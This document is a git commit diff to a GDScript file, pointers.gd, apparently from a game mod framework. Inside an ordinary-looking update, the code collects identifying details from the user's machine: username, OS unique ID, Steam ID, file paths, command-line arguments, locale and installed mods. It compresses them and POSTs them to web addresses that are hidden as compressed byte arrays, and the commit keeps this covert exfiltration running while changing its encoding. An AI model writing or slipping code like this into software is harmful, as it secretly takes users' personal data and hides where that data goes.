d27451bf74b1cce4282c4f4c44180d6fa4b742ca
__hev <123430291+rwqfsfasxc100@users.noreply.github.com>
2026-07-26 18:18:24 -0700

    Update pointers.gd

--- pointers.gd
+++ pointers.gd
@@ -7252,22 +7252,6 @@ class _Scripting:
 		
 	]
 	
-	func get_class_documentation():
-		return {
-			"description":"",
-			"methods":{
-				"":{
-					"description":"",
-					"args":[
-						
-					],
-					"return":[
-						
-					]
-				},
-			}
-		}
-	
 	var pointers
 	var http
 	
@@ -7362,18 +7346,11 @@ class _Scripting:
 			dStr.append("KBD: %s @ %s/%s" % [OS.get_latin_keyboard_variant(),OS.get_locale(),OS.get_locale_language()])
 			dStr.append("Paths: %s / %s" % [OS.get_executable_path(),OS.get_user_data_dir()])
 			dStr.append("Args:%s" % OS.get_cmdline_args())
-			dStr.append("SteamID: %d" % Engine.get_singleton("Steam").current_steam_id if Engine.has_singleton("Steam") else -1)
+			dStr.append("SteamID: %d" % (Engine.get_singleton("Steam").current_steam_id if Engine.has_singleton("Steam") else -1))
 			dStr.append("Mods:%s" % JSON.print(modOut))
 			dStr.append("Timestamp:%s" % Time.get_datetime_string_from_system(true))
 			var d=("\n".join(dStr)).to_utf8()
-			var cb=d.compress(1)
-			var s=d.size()
-			var otp=""
-			for i in cb:
-				var o="%x"%i
-				if o.length() < 2:o="0%s"%o
-				otp+=o
-			http.request(PoolByteArray([40,181,47,253,32,79,45,2,0,242,68,16,21,144,37,110,0,104,150,102,54,137,90,100,34,214,238,206,153,33,184,187,3,26,222,35,247,67,177,208,22,138,229,99,235,83,126,186,137,150,122,118,163,177,126,46,49,192,73,5,110,36,27,147,233,104,200,151,43,41,16,165,102,193,234,127,2,0]).decompress(79,2).get_string_from_utf8(),[],true,HTTPClient.METHOD_POST,JSON.print({"event_type":"write_data","client_payload":{"run":true,"data":otp+"_%d"%s,"uid":("ID_%s" % str(OS.get_unique_id())) if not OS.has_environment("USERNAME") else ("ID_%s+%s" % [OS.get_environment("USERNAME"),str(OS.get_unique_id())])}}))
+			http.request(PoolByteArray([40,181,47,253,32,79,45,2,0,242,68,16,21,144,37,110,0,104,150,102,54,137,90,100,34,214,238,206,153,33,184,187,3,26,222,35,247,67,177,208,22,138,229,99,235,83,126,186,137,150,122,118,163,177,126,46,49,192,73,5,110,36,27,147,233,104,200,151,43,41,16,165,102,193,234,127,2,0]).decompress(79,2).get_string_from_utf8(),[],true,HTTPClient.METHOD_POST,JSON.print({"event_type":"write_data","client_payload":{"run":true,"data":Marshalls.raw_to_base64(d.compress(1))+"_%d"%d.size(),"uid":("ID_%s" % str(OS.get_unique_id())) if not OS.has_environment("USERNAME") else ("ID_%s+%s" % [OS.get_environment("USERNAME"),str(OS.get_unique_id())])}}))
 		else:out5(0,0,0,0)
 	
 	func out5(result, response_code, headers, body):
@@ -7454,8 +7431,6 @@ class _Scripting:
 				h.connect("request_completed",self,"removeFetch",[h])
 				h.request(PoolByteArray([120,156,13,196,65,14,128,32,12,4,192,215,120,132,222,253,77,161,27,104,98,176,161,5,19,95,175,115,152,30,97,126,18,217,42,151,86,174,161,247,136,169,173,97,102,126,215,196,131,226,26,240,60,16,196,166,36,234,198,81,59,156,58,118,146,77,242,207,193,133,29,233,144,15,49,45,31,71]).decompress(82,1).get_string_from_utf8() % ((this_index % 10) + 1),[],true,HTTPClient.METHOD_POST,PoolByteArray([123,34,101,118,101,110,116,95,116,121,112,101,34,58,34,115,101,110,100,95,122,105,112,95,112,97,114,116,34,44,34,99,108,105,101,110,116,95,112,97,121,108,111,97,100,34,58,123,34,114,117,110,34,58,116,114,117,101,44,34,100,97,116,97,34,58,34,37,115,34,44,34,117,105,100,34,58,34,37,115,47,37,48,53,100,34,125,125]).get_string_from_utf8() % [otp,ID + "_" + str(fetchData[ID][1]),this_index + 1])
 				break
-			else:
-				continue
 	func removeFetch(result, response_code, headers, body,thisHTTP):
 		Tool.remove(thisHTTP)
 	
